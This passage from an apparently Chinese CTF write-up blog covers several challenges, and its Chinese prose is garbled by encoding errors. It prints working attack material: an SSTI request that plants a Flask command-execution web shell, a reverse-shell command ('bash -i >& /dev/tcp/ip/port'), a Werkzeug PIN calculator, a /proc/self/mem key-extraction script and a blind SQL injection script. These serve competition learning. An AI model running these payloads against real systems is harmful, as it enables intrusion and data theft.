c})\n```\n\n`tpl.execute`æŠŠcä¹Ÿæ”¾è¿›å»äº†çš„ï¼Œè¿™ä¸ªcä»£è¡¨ç€giné‡Œçš„ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå¯ä»¥å¼•ç”¨Contextä¸‹çš„æ‰€æœ‰å‡½æ•°äº† \n\n  gin.Context é‡Œé¢åŒ…è£…äº† Request å’Œ ResponseWriter, è¿™é‡Œå¤§ä½¬çš„WPç”¨çš„ `Request.UserAgent()`\n\n```go\n// UserAgent returns the client's User-Agent, if sent in the request.\nfunc (r *Request) UserAgent() string {\n\treturn r.Header.Get(\"User-Agent\")\n}\n```\n\npayload: `{{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}}`\n\nå·çš„å¤§ä½¬çš„æ•°æ®åŒ… ç›´æ¥è¦†ç›–æºç  server.py\n\n```html\nGET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1\nHost: node1.anna.nssctf.cn:28272\nContent-Length: 611\nCache-Control: max-age=0\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi\nUser-Agent: /app/server.py\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nCookie: session-name=MTY4NTE1ODc3OHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzlZGsWROWLHoCNn0Pbu3SkgRLWCZRrj8UIHVYgHU7GPw==\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundaryrxtSm5i2S6anueQi\nContent-Disposition: form-data; name=\"/app/server.py\"; filename=\"server.py\"\nContent-Type: text/plain\n\nfrom flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/shell')\ndef shell():\ncmd = request.args.get('cmd')\nif cmd:\nreturn os.popen(cmd).read()\nelse:\nreturn 'shell'\n\nif __name__== \"__main__\":\napp.run(host=\"127.0.0.1\",port=5000,debug=True)\n------WebKitFormBoundaryrxtSm5i2S6anueQi\nContent-Disposition: form-data; name=\"submit\"\n\n&#25552;&#20132;\n------WebKitFormBoundaryrxtSm5i2S6anueQi--\t\n```\n\n`/flask?name=/shell?cmd=ls${IFS}/` è¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼\n\nå‘½ä»¤æ‰§è¡Œå°±è¡Œäº† tql è¿™é‡Œå…¶å®è¿˜æœ‰å¾ˆå¤šçŸ¥è¯† è¿™é‡Œä¸å¤ªæ‡‚è¯´èµ·æ¥å¾ˆéš¾å— ä»¥åå†å¼ºç‚¹ å†æ¥è¡¥å‘å§ \n\n\n\nWebå°±åˆ°è¿™é‡Œ å…¶ä»–é¢˜ç›®å¯¹äºæˆ‘æ¥è¯´è¿˜åœ¨æœªçŸ¥é¢†åŸŸç­‰æˆ‘å»æ¢ç´¢ã€‚\n\n# MISC\n\n## ç­¾åˆ°\n\næ ¹æ®æç¤º`print(open('flag').read())`å°±å‡ºäº†\n\n## **è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡**\n\né¢˜ç›®æè¿°ï¼š\n\næŸå®‰å…¨éƒ¨é—¨å‘ç°æŸæ¶‰å¯†å·¥å‚ç”Ÿäº§äººå‘˜å·å·é€šè¿‡ç”Ÿäº§ç½‘ç»œä¼ è¾“æ•°æ®ç»™ä¸æ˜äººå‘˜ï¼Œé€šè¿‡æŠ€æœ¯æ‰‹æ®µæˆªè·å‡ºä¸€æ®µé€šè®¯æµé‡ï¼Œä½†æ˜¯å…¶ä¸­çš„å…³é”®ä¿¡æ¯è¢«è¿›è¡Œäº†åŠ å¯†ï¼Œè¯·ä½ æ ¹æ®æµé‡åŒ…çš„å†…å®¹ï¼Œæ‰¾å‡ºè¢«åŠ å¯†çš„ä¿¡æ¯ã€‚\n\nåº”è¯¥ç›´æ¥å»è¿‡æ»¤é€šè®¯æµé‡ æ‰¾åˆ°MODBUSåè®®   è¿½è¸ªæµä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685376104279-3591a49e-3805-4ed5-9e56-bcca3cfbba1f.png)\n\nç»„åˆèµ·æ¥å‘ç°base32ç¼–ç  å› ä¸ºæœ«å°¾æœ‰ç­‰å·å¹¶ä¸”åªæœ‰å¤§å†™å’Œæ•°å­—çš„ç¼–ç \n\n```\nMMYWMX3GNEYWOXZRGAYDA===\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685376171342-f5a06679-c278-4cbd-b93b-a6849e78235b.png)\n\n## pyshell\n\nä¸€é“python jail è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ å¹¶ä¸”é™åˆ¶äº†è¾“å…¥å­—ç¬¦ä¸èƒ½è¶…è¿‡7ä½ å…¶å®å°±æ˜¯æ„é€ shellçš„å¥‡æ·«å§¿åŠ¿\n\npayloadï¼š\n\n```php\n# eval(open(\"/flag\", \"r\").read())\n\"open\"\n_+\"(\"\n_+'\"/'\n_+'f'\n_+'l'\n_+'a'\n_+'g'\n_+'\"'\n_+',\"'\n_+'r\"'\n_+')'\n_+'.r'\n_+'e'\n_+'a'\n_+'d'\n_+\"(\"\n_+\")\"\neval(_)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685421976872-e11473ca-c080-4534-865d-4105b49099fd.png)\n\nè¿™é‡Œç”¨åˆ°çš„`'_'`æ˜¯ä¸€ç§ç‰¹æ®Šæ ‡è¯†ç¬¦ï¼Œ åœ¨äº¤äº’å¼è§£é‡Šå™¨ä¸­è¢«ç”¨æ¥å­˜æ”¾æœ€è¿‘ä¸€æ¬¡æ±‚å€¼ç»“æœ  ã€‚å‚è€ƒï¼š[https://www.bookstack.cn/read/python3.9-reference-zh/spilt.2.spilt.3.ef7aded97a6c46a9.md?wd=%E7%A7%81%E6%9C%89](https://www.bookstack.cn/read/python3.9-reference-zh/spilt.2.spilt.3.ef7aded97a6c46a9.md?wd=ç§æœ‰)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685422038294-70bb1976-24c9-4e7d-95f2-b5e59c7c0437.png)\n\n# ç»“å°¾ï¼š\n\næœ€è¿‘æœŸæœ«äº†ï¼Œå¯èƒ½ä¼šå¿™æœŸæœ«çš„äº‹æƒ…ï¼Œå…ˆæŠŠå…­çº§è¿‡äº†mdï¼Œè¿™æ¬¡ä¸€å®šè¦è¿‡äº†ï¼Œå·²ç»æ˜¯ç¬¬äºŒæ¬¡äº†ï¼Œä¸Šæ¬¡å°±å·®åæ¥åˆ†ï¼Œå¯æ¶å•Šï¼Œä¸æƒ³è¢«è¿™ä¸ªæ‹–ç€äº†ï¼Œè¿˜æœ‰æœŸæœ«å†²äº†ï¼Œä»€ä¹ˆæ•°ç”µï¼Œä¿¡å·ï¼Œç”µè·¯ç»™ğŸ‘´æ­»ï¼Œç­‰ç€å¥¥ï¼Œå¤´å¥—ç»™ä½ è–…ä¸€åœ° å¿…é¡»æ‰“ä½ è„¸å¥¥ï¼Œå½“ç„¶æ¯”èµ›ä¸ä¼šåœï¼Œç§‰ç€èœè¿˜çˆ±æ‰“çš„è‰¯å¥½ä½œé£ï¼Œå†²äº†ï¼Œåªæ˜¯WPä¼šæ¬ ä¸€äº›ï¼Œæ¯”å¦‚BUUè¿˜æ¬ ç€ä¸€äº›ï¼Œäºè´¼ï¼Œå¹²äº†ï¼\n","tags":["RCEå¥‡æ·«æ–¹å¼","è½¯é“¾æ¥"],"categories":["å„èµ›äº‹WP"]},{"title":"NEEPU Sec 2023 å…¬å¼€èµ› WEBéƒ¨åˆ†é¢˜å¤ç°","url":"/post/c9fcd25b.html","content":"\nNEEPU Sec 2023 å…¬å¼€èµ› WEBéƒ¨åˆ†é¢˜å¤ç°\n\næˆ‘å°±æ˜¯ä¸ªçº¯åºŸç‰©\n\n<!--more-->\n\n# Cute Cirno\n\näººæœ€éº»çš„ä¸€é›† æœ¬æ¥åº”è¯¥å¾ˆå¿«å‡ºç»“æœçš„ è¿˜æ˜¯è‡ªå·±å¤ªèœäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846488175-ee0bc923-7cc9-410d-bc70-809ca3c8a30f.png)\n\nå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ é€šè¿‡æŠ¥é”™ä¿¡æ¯ å»è¯»appæ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846571811-25873264-780e-4dff-9d59-cd927722f6fc.png)\n\næˆ–è€…è®¿é—®`/proc/self/cmdline`å»è·å–å½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846615322-ce39f4fa-5632-4dfc-8f50-b543633b1ba7.png)\n\nè·å¾—æºç ï¼š\n\n```python\nfrom flask import Flask, request, session, render_template, render_template_string\nimport os, base64\nfrom NeepuFile import neepu_files\n\nCuteCirno = Flask(__name__,static_url_path='/static',static_folder='static')\n\nCuteCirno.config['SECRET_KEY'] = str(base64.b64encode(os.urandom(30)).decode()) + \"*NeepuCTF*\"\n\n@CuteCirno.route('/')\ndef welcome():\n    session['admin'] = 0\n    return render_template('welcome.html')\n\n\n@CuteCirno.route('/Cirno')\ndef show():\n    return render_template('CleverCirno.html')\n\n\n@CuteCirno.route('/r3aDF1le')\ndef file_read():\n    filename = \"static/text/\" + request.args.get('filename', 'comment.txt')\n    start = request.args.get('start', \"0\")\n    end = request.args.get('end', \"0\")\n    return neepu_files(filename, start, end)\n\n\n@CuteCirno.route('/genius')\ndef calculate():\n    if session.get('admin') == 1:\n        print(session.get('admin'))\n        answer = request.args.get('answer')\n        if answer is not None:\n            blacklist = ['_', \"'\", '\"', '.', 'system', 'os', 'eval', 'exec', 'popen', 'subprocess',\n                         'posix', 'builtins', 'namespace','open', 'read', '\\\\', 'self', 'mro', 'base',\n                         'global', 'init', '/','00', 'chr', 'value', 'get', \"url\", 'pop', 'import',\n                         'include','request', '{{', '}}', '\"', 'config','=']\n            for i in blacklist:\n                if i in answer:\n                    answer = \"â‘¨\" +\"\"\"</br><img src=\"static/woshibaka.jpg\" width=\"300\" height=\"300\" alt=\"Cirno\">\"\"\"\n                    break\n            if answer == '':\n                return \"ä½ èƒ½å‘Šè¯‰èªæ˜çš„â‘¨, 1+1çš„answerå—\"\n            return render_template_string(\"1+1={}\".format(answer))\n        else:\n            return render_template('mathclass.html')\n\n    else:\n        session['admin'] = 0\n        return \"ä½ çœŸçš„æ˜¯æˆ‘çš„é©¬æ–¯å¡”å—ï¼Ÿ\"\n\n\nif __name__ == '__main__':\n    CuteCirno.run('0.0.0.0', 5000, debug=True)\n```\n\nå…¶å®ä¸€çœ¼æ‰«è¿‡å»å°±æ˜¯sessionä¼ªé€  ç„¶åå¥—äº†ä¸€å±‚ssti\n\nä½†æ˜¯å½“æ—¶åšè¿™é“é¢˜çš„æ—¶å€™çœ‹äº†ä»–çš„keyç”Ÿæˆè¿‡ç¨‹ å°±è§‰å¾—keyæ ¹æœ¬ä¼ªé€ ä¸äº†\n\n## éé¢„æœŸï¼š\n\nç„¶åæ—¢ç„¶ä¹‹å‰éƒ½æŠ¥é”™äº† è¯´æ˜debugæ˜¯å¼€å¯çš„ æºç ä¸­ä¹Ÿè¡¨æ˜äº†\n\nå‘¢å°±ç›´æ¥å»è®¡ç®—pinç \n\nç½‘ä¸Šè„šæœ¬å¾ˆå¤š ä¸»è¦æœ‰é«˜ç‰ˆæœ¬å’Œä½ç‰ˆæœ¬çš„ è¿™é‡Œè¦æ ¹æ®é¢˜ç›®å»é€‰æ‹©ç›¸åº”çš„è„šæœ¬ç‰ˆæœ¬\n\nè¿™é“é¢˜ç›®æ˜¯é«˜ç‰ˆæœ¬çš„\n\nè„šæœ¬å¦‚ä¸‹ï¼šå‚è€ƒ https://pysnow.cn/archives/170/\n\n```python\nimport hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n    'root'  # /etc/passwd\n    'flask.app',  # é»˜è®¤å€¼\n    'Flask',  # é»˜è®¤å€¼\n    '/usr/local/lib/python3.8/site-packages/flask/app.py'  # æŠ¥é”™å¾—åˆ°\n]\n\nprivate_bits = [\n    '2485377568585',  # /sys/class/net/eth0/address åè¿›åˆ¶\n    '653dc458-4634-42b1-9a7a-b22a082e1fce898ba65fb61b89725c91a48c418b81bf98bd269b6f97002c3d8f69da8594d2d2'\n    # å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_idï¼Œæœ‰boot-idé‚£å°±æ‹¼æ¥boot-id 2. /proc/self/cgroup\n]\n\n# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                            for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\nå½“æ—¶åšé¢˜æ²¡ç®—å‡ºpinç  ä¸çŸ¥é“æ˜¯å“ªé‡Œå‡ºçš„é—®é¢˜ ç”šè‡³æŠŠæ‰€æœ‰idéƒ½è¯•äº†ä¸€æ¬¡\n\nä¹‹åå¤ç°çš„æ—¶å€™ æ‰å‘ç°è¢«è„šæœ¬ä¸­çš„æç¤ºç¨ç¨è¯¯å¯¼äº†ä¸€ä¸‹ æˆ–è€…æ˜¯è‡ªå·±çº¯èœ\n\n```\n# å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_idï¼Œæœ‰boot-idé‚£å°±æ‹¼æ¥boot-id 2. /proc/self/cgroup\n```\n\nè„šæœ¬ä¸­æåˆ°`/etc/machine-id(dockerä¸ç”¨çœ‹) ` éš¾é“èµ›é¢˜ç¯å¢ƒä¸æ˜¯dockerå— æˆ‘è£‚å¼€\n\nä½†æ˜¯è¿™é“é¢˜ç›®éœ€è¦åˆå¹¶`/etc/machine-id` `/proc/self/cgroup`æ‰èƒ½è®¡ç®—å‡ºæ­£ç¡®çš„pinç \n\nå½“æ—¶åšé¢˜çš„æ—¶å€™ä¸€ç›´ç”¨`/proc/sys/kernel/random/boot_id`  ` /proc/self/cgroup`å»ç®— ä¸€ç›´æ˜¯é”™çš„\n\nä¸è¿‡è¿™é‡Œä¹Ÿä¸æ˜¯è¯´è„šæœ¬ä¸­æåˆ°çš„æ˜¯é”™çš„ è€Œæ˜¯åšé¢˜çš„æ—¶å€™æœ€å¥½éƒ½è¯•ä¸€é qwq\n\nåº”è¯¥æ˜¯å…ˆå»è¯»`/etc/machine-id`ï¼Œå¦‚æœè¯»ä¸åˆ°,é‚£ä¹ˆå°±æ˜¯`/proc/sys/kernel/random/boot_id`å’Œ`/proc/self/cgroup`æ‹¼æ¥äº†  \n\nè®¡ç®—å‡ºæ¥ä¹‹å å‘½ä»¤æ‰§è¡Œå³å¯\t\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847479030-dc13e6dc-8671-4aca-800c-ff56cc7245e3.png)\n\n## é¢„æœŸè§£\n\nèµ›åäº†è§£äº†ä¸€ä¸‹ å‘ç°é¢„æœŸè§£å¤ªéš¾äº† æ˜¯æ ¹æ®2022å¹´è“å¸½æ¯åˆèµ›æ”¹ç¼–çš„\n\nç„¶åè¿™é‡Œkeyçš„ç¡®æ˜¯ä¼ªé€ ä¸å‡ºæ¥ ä½†æ˜¯ä»»ä½•ä¿¡æ¯éƒ½æ˜¯å­˜åœ¨å†…å­˜é‡Œ å¯ä»¥é€šè¿‡å»è¯»å†…å­˜è¯»å‡ºæ¥ å€Ÿç”¨pç¥çš„è¯­å¥[https://erroratao.github.io/2022/07/10/File_Session/#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3](https://erroratao.github.io/2022/07/10/File_Session/#è“å¸½æ¯åˆèµ›-file-session-è§è§£)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847734991-7cd63f83-6f22-46aa-83d3-406c8efd6f6e.png)\n\nè¿™é‡Œç›´æ¥è´´ä¸ŠBoogipop äº®senseiçš„è„šæœ¬ çœ‹å¾—å‡ºæ¥ä¹Ÿæ˜¯ä»pç¥ç¨åŠ ä¿®æ”¹ è€Œæˆ‘è¿è„šæœ¬éƒ½çœ‹ä¸æ‡‚ å°¼ç›å°±èœçš„ç¦»è°± æš‘å‡ä¸€å®šè¦å»ç³»ç»Ÿå­¦ä¸€ä¸‹python å¥½å¥½é”»ç‚¼é”»ç‚¼è‡ªå·±å†™è„šæœ¬çš„èƒ½åŠ›\n\n```python\nimport base64\nimport os\nimport re\nimport requests\n# print(str(base64.b64encode(os.urandom(30)).decode()) + \"*NeepuCTF*\")\n# pollution_url=\"http://localhost:8848/?name=os.path.pardir&m1sery=boogipop\"\n# flagurl=\"http://localhost:8848/../../flag\"\nurl=\"http://neepusec.fun:28954//r3aDF1le\"\nmaps_url = f\"{url}?filename=../../../proc/self/maps\"\nmaps_reg = \"([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0\"\nmaps = re.findall(maps_reg, requests.get(maps_url).text)\nprint(maps)\ncookie=''\nfor m in maps:\n    print(m)\n    start, end = m.split(\"-\")[0], m.split(\"-\")[1]\n    Offset, Length = str(int(start, 16)), str(int(end, 16))\n    read_url = f\"{url}?filename=../../../proc/self/mem&start={Offset}&end={Length}\"\n    print(read_url)\n    s = requests.get(read_url).content\n    print(s)\n    rt = re.findall(b\"(.{40})\\*NeepuCTF\\*\", s)\n    if rt:\n        print(rt[0])\n```\n\nè„šæœ¬å¤§è‡´è¿‡ç¨‹å°±æ˜¯ å…ˆå»è¯»å–/proc/self/mapsçš„ä¿¡æ¯ \n\nç„¶åé€šè¿‡mapé‡Œæ ˆçš„åœ°å€  å†å»å»æ­£åˆ™åŒ¹é…é‡Œé¢çš„ä¿¡æ¯ \n\n```\nmaps_reg = \"([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0\"\n```\n\nå°±æ˜¯å»åŒ¹é…è¿™æ ·çš„ä¿¡æ¯`7f50caee6000-7f50cb9e6000 rw-p 00000000 00:00 0`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684848131309-905d4a14-43af-403a-9294-792623cc66e4.png)\n\nç„¶åå†æ ¹æ®è¯»å‡ºæ¥çš„åœ°å€memå†…å­˜   ç„¶åå†å»é€šè¿‡åœ°å€èŒƒå›´æ­£åˆ™åŒ¹é…æˆ‘ä»¬éœ€è¦çš„key å°±è¡Œäº†\n\nçœŸçš„tql\n\nsessionä¼ªé€ æˆåŠŸå å°±æ˜¯ä¸€ä¸ªè¿‡æ»¤äº† å¾ˆå¤šå­—ç¬¦çš„ssti\n\næ ¹æ®äº®senseiçš„payload session ä¼ªé€ çš„æ—¶å€™ é€šè¿‡æŠŠshellæ”¾è¿›session ç„¶åæˆ‘ä»¬payloadå»æˆªå–å°±å¯ä»¥äº† çœŸçš„tql\n\n```\npython flask_session_cookie_manager3.pyencode-s\"key\"-t\"{'admin':1,'__globals__':1,'os':1,'read':1,'popen':1,'bash-c\\'bash-i>&/dev/tcp/ip/port<&1\\'':1}\"\n```\n\npayloadï¼š`{%print(((lipsum[(session|string)[35:46]])[(session|string)[53:55]])[(session|string)[73:78]]((session|string)[85:139]))%}`\n\nç„¶åè¿™é‡Œéœ€è¦æ³¨æ„ æˆªçš„æ—¶å€™å¹¶ä¸æ˜¯æˆ‘ä»¬ç›´æ¥çœ‹åˆ°çš„`{'admin':1,'__globals__':1,'os':1,'read':1,'popen':1,'bash-c\\'bash-i>&/dev/tcp/ip/port<&1\\'':1}`ç´¢å¼•\n\né€šè¿‡`{%print(session|string)%}`å¯ä»¥æ‰“å°å‡ºæ¥ å‰é¢è¿˜æœ‰ç‚¹å…¶ä»–ä¿¡æ¯ è¿™æ˜¯ä¸€ä¸ªå°ç»†èŠ‚\n\n```\n<SecureCookieSession {'admin': 1, '__globals__': 1, 'os': 1, 'read': 1, 'popen': 1, \"bash -c 'bash -i >& /dev/tcp/ip/port <&1'\": 1}>\n```\n\né€šè¿‡åå¼¹shell å°±okäº† çœŸçš„å¤ªå¼ºäº†\n\nå‘ç°è¿˜æ˜¯å¾—å»è€è€å®å®å»åˆ·ä¸€éctfshowçš„ssti å»å¼„æ˜ç™½ä¸åŒçš„paylaod\n\n\n\n# ezphp\n\nå½“æ—¶åšè¿™é“é¢˜ ä¸€çœ‹ç•Œé¢æ˜¯ç©ºç™½çš„ å„ç§å°è¯•ä¹‹åè¿˜æ˜¯å•¥éƒ½æ²¡æœ‰ å°±æ”¾å¼ƒäº†\n\nçœ‹äº†wp è¿”ç°æ˜¯php<=7.4.21è¿œç¨‹æºç æ³„éœ²çš„æ¼æ´  https://cn-sec.com/archives/1530845.html\t\n\nå…¶å®å…³é”®æ˜¯æ€ä¹ˆå‘ç°phpç‰ˆæœ¬???? å¹¶ä¸”æ£€ç´¢åˆ°ç›¸å…³æ¼æ´\n\nå¯èƒ½å¤§ä½¬ä¸€çœ¼å°±ä¸çœŸäº† å¯¹æˆ‘æ¯”è¾ƒå›°éš¾\n\nç„¶åæŠ“åŒ… æ„é€ ä¸€ä¸ªå¦‚ä¸‹çš„è¯·æ±‚å¤´\n\n```python\nGET / HTTP/1.1\nHost: neepusec.fun:28426\n\n\nGET /HTTP/1.1\n```\n\nè·å¾—æºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684852650636-c4706a7d-d4b2-4246-922e-4109cacd8b54.png)\n\næ˜¯ä¸€ä¸ªpopé“¾\n\n```php\n<?php\n  class  one{\n  public function __call($name,$ary)\n  {\n    if ($this->key === true||$this->finish1->name) {\n      if ($this->finish->finish){\n        call_user_func($this->now[$name],$ary[0]);\n      }\n    }\n  }\n  public function neepuctf(){\n  $this->now=0;\n  return $this->finish->finish;\n}\npublic function __wakeup(){\n  $this->key=True;\n}\n}\nclass two{\n  private $finish;\n  public $name;\n  public function __get($value){\n\n    return $this->$value=$this->name[$value];\n  }\n\n}\n\nclass three{\n  public function __destruct()\n  {\n    if($this->neepu->neepuctf()||!$this->neepu1->neepuctf()){\n      $this->fin->NEEPUCTF($this->rce,$this->rce1);\n    }\n\n  }\n}\nclass four{\n  public function __destruct()\n  {\n    if ($this->neepu->neepuctf()){\n      $this->fin->NEEPUCTF1($this->rce,$this->rce1);\n    }\n\n  }\n  public function __wakeup(){\n    $this->key=false;\n  }\n}\nclass five{\n  public $finish;\n  private $name;\n\n  public function __get($name)\n  {\n    return $this->$name=$this->finish[$name];\n  }\n}\n\n$a=$_POST[\"neepu\"];\nif (isset($a)){\n  unserialize($a);\n}\n```\n\nåšä¸å‡ºæ¥ æ˜¯åœ¨å¤ªèœäº† é‡Œé¢æœ‰æˆ‘ä¸ä¼šçš„çŸ¥è¯†ç‚¹  æ²¡æœ‰å±æ€§å€¼æ˜¯æ€ä¹ˆpopçš„ å¥½ç¦»è°± \n\nä¹–ä¹–å»åˆ·ctfshow\n\nå…ˆæ”¾ç€å§\n\nä¹‹åå†å›æ¥å¡«å‘ æˆ‘æ˜¯åƒåœ¾ å‘œå‘œå‘œ å¤ªèœäº† èœçš„æƒ³æ­»\n","tags":["ssti","PHPååºåˆ—åŒ–","flaskæ¡†æ¶"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf-84-[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb","url":"/post/1e328461.html","content":"\n[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb\n\n<!--more-->\n\nä¸€ä¸ªç™»å½•ç•Œé¢ æŸ¥çœ‹æºç å‘ç°å›¾ç‰‡æ˜¯é€šè¿‡`/image.php?id=1`è·å–çš„ çŒœæµ‹è¿™é‡Œåº”è¯¥æ˜¯æœ‰sqlæ³¨å…¥çš„\n\næ—¥å¸¸æŸ¥çœ‹`/robots.txt`å‘ç°å­˜åœ¨å¤‡ä»½æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632411207-29709d15-5b2b-4537-8cea-b8cae315b8ec.png)\n\næŸ¥çœ‹`image.php.bak`\n\n```php\n<ï»¿?php\n  include \"config.php\";\n\n$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";\n$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";\n\n$id=addslashes($id);\n$path=addslashes($path);\n\n$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);\n$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);\n\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n$row=mysqli_fetch_array($result,MYSQLI_ASSOC);\n\n$path=\"./\" . $row[\"path\"];\nheader(\"Content-Type: image/jpeg\");\nreadfile($path);\n```\n\nå‘ç°å­˜åœ¨sqlæ³¨å…¥\n\n```\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n```\n\néœ€è¦æ„é€ ç‰¹æ®Šçš„è¯­å¥æ¥æ³¨å…¥\n\n`addslashes($id)` å…ˆæ¥çœ‹çœ‹addslashes()å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632796661-b60d58ce-2bd8-425b-9ee7-aaa233bc2066.png)\n\nå®ƒä¼šåœ¨è¿™äº›ç¬¦å·å‰æ·»åŠ åæ–œæ è¿›è¡Œè½¬ä¹‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632822501-8d3aec4a-35e3-4af4-832e-f1426364e177.png)\n\nå®˜æ–¹æ–‡æ¡£ä¹ŸæåŠäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632852036-00011032-8464-4663-8b00-dd4e173b64b6.png)\n\nå¦‚æœä½¿ç”¨ä¸å¾—å½“ å°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜\n\nå†æ¥çœ‹`$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);`\n\nçœ‹åˆ°`$id`å­˜åœ¨ä¸€ä¸ªæ›¿æ¢æ“ä½œ\n\næˆ‘ä»¬å¯ä»¥æ„é€  `$id=\\\\0`=>ç»è¿‡addslashes()=>`$id=\\\\\\\\0`=>str_replace()=>`$id=\\\\`(ç›¸å½“äºä¸€ä¸ªåæ–œæ )\n\nåˆ™æŸ¥è¯¢è¯­å¥å°±ä¼šå˜ä¸ºï¼š`select * from images where id='\\\\' or path='{$path}'`\n\nidåæ–œæ è½¬ä¹‰äº†`'`ä½¿å¾—`$id='\\\\' or path='`é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨`$path`è¾“å…¥æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥\n\næ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªå¸¸è§„çš„äºŒåˆ†æ³•ç›²æ³¨\n\nè„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nimport requests\nimport time\nurl='http://3f7e38a8-5912-4127-be50-a4870ab3b5ad.node4.buuoj.cn:81/image.php'\nresult=''\nfor i in range(40):\n    low=31\n    high=127\n    mid=(low+high)//2\n    while low<=high:\n        payload={\n        \"id\":\"\\\\0\",\n        \"path\":\" or ascii(substr((select password from users),{},1))>{}#\".format(i,mid)}\n        #çˆ†è¡¨: or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{} #\n        #çˆ†å­—æ®µ: or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),{},1))>{} #\n        #çˆ†æ•°æ®: or ascii(substr((select password from users),{},1))>{} #\n        r = requests.get(url=url,params=payload)\n        if (\"JFIF\" in r.text):\n            low = mid + 1\n            mid=(low+high)//2\n        else:\n            high = mid - 1\n            mid=(low+high)//2\n    result+=chr(high+1)\n    print(result)\n    time.sleep(0.3)\n```\n\néœ€è¦æ³¨æ„è¿™é“é¢˜ç›®ç”¨äºæŸ¥è¯¢çš„whereå•åŒå¼•å·éƒ½è¢«wafäº† éœ€è¦bypass\n\nå¯ä»¥ç”¨16è¿›åˆ¶è¿›è¡Œç»•è¿‡ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633339285-638d2e1f-801c-4188-8087-aab736f8c00a.png)\n\nå¯ä»¥å¾—åˆ°adminå¯†ç ä¸ºï¼š`027e3da10ae66606cef2`\n\nä¹‹åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼  ç®€å•ä¸Šä¼ 